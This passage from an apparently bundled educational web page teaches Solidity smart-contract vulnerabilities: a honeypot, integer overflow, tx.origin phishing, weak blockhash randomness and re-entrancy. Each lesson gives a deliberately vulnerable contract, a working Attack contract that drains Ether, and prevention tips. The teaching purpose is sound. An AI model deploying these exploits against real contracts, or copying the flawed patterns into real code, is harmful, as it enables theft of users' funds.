class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(_amount &lt;= balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>], <span class=\"hljs-string\">\"Insufficient funds\"</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: _amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n\n        balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] -= _amount;\n\n        logger.log(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, _amount, <span class=\"hljs-string\">\"Withdraw\"</span>);\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Logger</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Log</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> caller, <span class=\"hljs-keyword\">uint</span> amount, <span class=\"hljs-keyword\">string</span> action</span>)</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">log</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _caller, <span class=\"hljs-keyword\">uint</span> _amount, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _action</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">emit</span> Log(_caller, _amount, _action);\n    }\n}\n\n<span class=\"hljs-comment\">// Hacker tries to drain the Ethers stored in Bank by reentrancy.</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Attack</span> </span>{\n    Bank bank;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">Bank _bank</span>) </span>{\n        bank = Bank(_bank);\n    }\n\n    <span class=\"hljs-keyword\">fallback</span>() <span class=\"hljs-keyword\">external</span> <span class=\"hljs-keyword\">payable</span> {\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">address</span>(bank).<span class=\"hljs-built_in\">balance</span> &gt;= <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>) {\n            bank.withdraw(<span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>);\n        }\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">attack</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        bank.deposit{<span class=\"hljs-built_in\">value:</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>}();\n        bank.withdraw(<span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getBalance</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>;\n    }\n}\n\n<span class=\"hljs-comment\">// Let&#x27;s say this code is in a separate file so that others cannot read it.</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">HoneyPot</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">log</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _caller, <span class=\"hljs-keyword\">uint</span> _amount, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _action</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n    </span>{\n        <span class=\"hljs-keyword\">if</span> (equal(_action, <span class=\"hljs-string\">\"Withdraw\"</span>)) {\n            <span class=\"hljs-built_in\">revert</span>(<span class=\"hljs-string\">\"It&#x27;s a trap\"</span>);\n        }\n    }\n\n    <span class=\"hljs-comment\">// Function to compare strings using keccak256</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">equal</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _a, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _b</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>)\n    </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encode</span>(_a)) == <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encode</span>(_b));\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Arithmetic Overflow and Underflow\"\nexport const description = \"An example of hacking Solidity with arithmetic overflow / underflow\"\n\nconst html = `<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>Integers in Solidity overflow / underflow without any errors.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">// This contract is designed to act as a time vault.</span>\n<span class=\"hljs-comment\">// User can deposit into this contract but cannot withdraw for atleast a week.</span>\n<span class=\"hljs-comment\">// User can also extend the wait time beyond the 1 week waiting period.</span>\n\n<span class=\"hljs-comment\">/*\n1. Deploy TimeLock\n2. Deploy Attack with address of TimeLock\n3. Call Attack.attack sending 1 ether. You will immediately be able to\n   withdraw your ether.\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow and was able to withdraw\nbefore the 1 week waiting period.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">TimeLock</span> </span>{\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) <span class=\"hljs-keyword\">public</span> balances;\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) <span class=\"hljs-keyword\">public</span> lockTime;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deposit</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] += <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>;\n        lockTime[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] = <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span> + <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">weeks</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">increaseLockTime</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _secondsToIncrease</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        lockTime[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] += _secondsToIncrease;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">withdraw</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] &gt; <span class=\"hljs-number\">0</span>, <span class=\"hljs-string\">\"Insufficient funds\"</span>);\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span> &gt; lockTime[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>], <span class=\"hljs-string\">\"Lock time not expired\"</span>);\n\n        <span class=\"hljs-keyword\">uint</span> amount = balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>];\n        balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] = <span class=\"hljs-number\">0</span>;\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Attack</span> </span>{\n    TimeLock timeLock;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">TimeLock _timeLock</span>) </span>{\n        timeLock = TimeLock(_timeLock);\n    }\n\n    <span class=\"hljs-keyword\">fallback</span>() <span class=\"hljs-keyword\">external</span> <span class=\"hljs-keyword\">payable</span> {}\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">attack</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        timeLock.deposit{<span class=\"hljs-built_in\">value:</span> <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>}();\n        <span class=\"hljs-comment\">/*\n        if t = current lock time then we need to find x such that\n        x + t = 2**256 = 0\n        so x = -t\n        */</span>\n        timeLock.increaseLockTime(\n            <span class=\"hljs-built_in\">type</span>(<span class=\"hljs-keyword\">uint</span>).<span class=\"hljs-built_in\">max</span> - timeLock.lockTime(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>))\n        );\n        timeLock.withdraw();\n    }\n}\n</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<ul>\n<li>Use <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol\" target=\"__blank\">SafeMath</a> to will prevent arithmetic overflow and underflow</li>\n</ul>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Phishing with tx.origin\"\nexport const description = \"An example of phishing with tx.origin in Solidity\"\n\nconst html = `<h3 id=\"whats-the-difference-between-msgsender-and-txorigin\">What&#39;s the difference between <code>msg.sender</code> and <code>tx.origin</code>?</h3>\n<p>If contract A calls B, and B calls C, in C <code>msg.sender</code> is B and <code>tx.origin</code> is A.</p>\n<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>A malicious contract can deceive the owner of a contract into calling a\nfunction that only the owner should be able to call.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\nWallet is a simple contract where only the owner should be able to transfer\nEther to another address. Wallet.transfer() uses tx.origin to check that the\ncaller is the owner. Let&#x27;s see how we can hack this contract\n*/</span>\n\n<span class=\"hljs-comment\">/*\n1. Alice deploys Wallet with 10 Ether\n2. Eve deploys Attack with the address of Alice&#x27;s Wallet contract.\n3. Eve tricks Alice to call Attack.attack()\n4. Eve successfully stole Ether from Alice&#x27;s wallet\n\nWhat happened?\nAlice was tricked into calling Attack.attack(). Inside Attack.attack(), it\nrequested a transfer of all funds in Alice&#x27;s wallet to Eve&#x27;s address.\nSince tx.origin in Wallet.transfer() is equal to Alice&#x27;s address,\nit authorized the transfer. The wallet transferred all Ether to Eve.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Wallet</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        owner = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\"><span class=\"hljs-built_in\">transfer</span></span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _to, <span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">tx</span>.<span class=\"hljs-built_in\">origin</span> == owner, <span class=\"hljs-string\">\"Not owner\"</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = _to.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> _amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Attack</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> <span class=\"hljs-keyword\">public</span> owner;\n    Wallet wallet;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">Wallet _wallet</span>) </span>{\n        wallet = Wallet(_wallet);\n        owner = <span class=\"hljs-keyword\">payable</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">attack</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        wallet.<span class=\"hljs-built_in\">transfer</span>(owner, <span class=\"hljs-keyword\">address</span>(wallet).<span class=\"hljs-built_in\">balance</span>);\n    }\n}</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<p>Use <code>msg.sender</code> instead of <code>tx.origin</code></p>\n<pre><code class=\"language-solidity\">    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\"><span class=\"hljs-built_in\">transfer</span></span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _to, <span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span> == owner, <span class=\"hljs-string\">\"Not owner\"</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = _to.<span class=\"hljs-built_in\">call</span>.<span class=\"hljs-built_in\">value</span>(_amount)(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Source of Randomness\"\nexport const description = \"Blockchain is not a reliable source of randomness in Solidity\"\n\nconst html = `<h3 id=\"vulnerability\">Vulnerability</h3>\n<p><code>blockhash</code> and <code>block.timestamp</code> are not reliable sources for randomness.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\n<span class=\"hljs-doctag\">NOTE:</span> cannot use blockhash in Remix so use ganache-cli\n\nnpm i -g ganache-cli\nganache-cli\nIn remix switch environment to Web3 provider\n*/</span>\n\n<span class=\"hljs-comment\">/*\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let&#x27;s see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">GuessTheRandomNumber</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{}\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">guess</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _guess</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">uint</span> answer = <span class=\"hljs-keyword\">uint</span>(<span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(\n            <span class=\"hljs-built_in\">blockhash</span>(<span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">number</span> - <span class=\"hljs-number\">1</span>),\n            <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span>\n        )));\n\n        <span class=\"hljs-keyword\">if</span> (_guess == answer) {\n            (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>}(<span class=\"hljs-string\">\"\"</span>);\n            <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n        }\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Attack</span> </span>{\n    <span class=\"hljs-keyword\">receive</span>() <span class=\"hljs-keyword\">external</span> <span class=\"hljs-keyword\">payable</span> {}\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">attack</span>(<span class=\"hljs-params\">GuessTheRandomNumber guessTheRandomNumber</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n         <span class=\"hljs-keyword\">uint</span> answer = <span class=\"hljs-keyword\">uint</span>(<span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(\n            <span class=\"hljs-built_in\">blockhash</span>(<span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">number</span> - <span class=\"hljs-number\">1</span>),\n            <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span>\n        )));\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    <span class=\"hljs-comment\">// Helper function to check balance</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getBalance</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>;\n    }\n}</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t use <code>blockhash</code> and <code>block.timestamp</code> as source of randomness</li>\n</ul>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Re-Entrancy\"\nexport const description = \"An example of re-entrancy attack in Solidity\"\n\nconst html = `<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>Let&#39;s say that contract <code>A</code> calls contract <code>B</code>.</p>\n<p>Reentracy exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes execution.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/*\nEtherStore is a contract where you can deposit any amount and withdraw at most\n1 Ether per week. This contract is vulnerable to re-entrancy attack.\nLet&#x27;s see why.\n\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">EtherStore</span> </span>{\n    <span class=\"hljs-comment\">// Withdrawal limit = 1 ether / week</span>\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">constant</span> <span class=\"hljs-keyword\">public</span> WITHDRAWAL_LIMIT = <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>;\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) <span class=\"hljs-keyword\">public</span> lastWithdrawTime;\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) <span class=\"hljs-keyword\">public</span> balances;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deposit</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] += <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">withdraw</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] &gt;= _amount);\n        <span class=\"hljs-built_in\">require</span>(_amount &lt;= WITHDRAWAL_LIMIT);\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span> &gt;= lastWithdrawTime[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] + <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">weeks</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: _amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n\n        balances[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] -= _amount;\n        lastWithdrawTime[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>] = <span class=\"hljs-built_in\">block</span>.<span class=\"hljs-built_in\">timestamp</span>;\n    }\n\n    <span class=\"hljs-comment\">// Helper function to check the balance of this contract</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getBalance</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Attack</span> </span>{\n    EtherStore <span class=\"hljs-keyword\">public</span> etherStore;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _etherStoreAddress</span>) </span>{\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    <span class=\"hljs-comment\">// Fallback is called when EtherStore sends Ether to this contract.</span>\n    <span class=\"hljs-keyword\">fallback</span>() <span class=\"hljs-keyword\">external</span> <span class=\"hljs-keyword\">payable</span> {\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">address</span>(etherStore).<span class=\"hljs-built_in\">balance</span> &gt;= <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>) {\n            etherStore.withdraw(<span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>);\n        }\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">attack</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span> &gt;= <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>);\n        etherStore.deposit{<span class=\"hljs-built_in\">value:</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>}();\n        etherStore.withdraw(<span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>);\n    }\n\n    <span class=\"hljs-comment\">// Helper function to check the balance of this contract</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getBalance</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>;\n    }\n}\n</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<ul>\n<li>Ensure all state changes happen 